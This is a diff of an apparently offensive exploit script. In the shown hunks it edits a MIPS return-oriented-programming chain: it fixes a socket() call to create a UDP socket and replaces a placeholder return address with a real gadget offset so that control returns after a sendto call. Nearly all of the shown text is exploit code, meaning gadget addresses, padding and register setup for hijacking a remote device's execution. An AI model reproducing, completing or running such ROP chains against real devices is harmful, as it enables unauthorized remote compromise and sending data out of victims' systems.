@@ -710,7 +710,7 @@ elif args.command == 'http':
             chain += b'b' * 8
             chain += p32(0x133d58 + base_address) # ra
 
-            # Call socket(2, 1, 0) and regain control
+            # Call socket(2, 2, 0) and regain control
             # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
             chain += b'b' * 0x18
             chain += p32(0xdeadbeef) # s0
@@ -813,7 +813,7 @@ elif args.command == 'http':
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
             chain += p32(sendto_addr) # v0 - sendto address
             chain += b'b' * 8
-            chain += p32(0x11111111) # ra
+            chain += p32(0x15114 + base_address) # ra
 
             # Call sendto and regain control
             # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
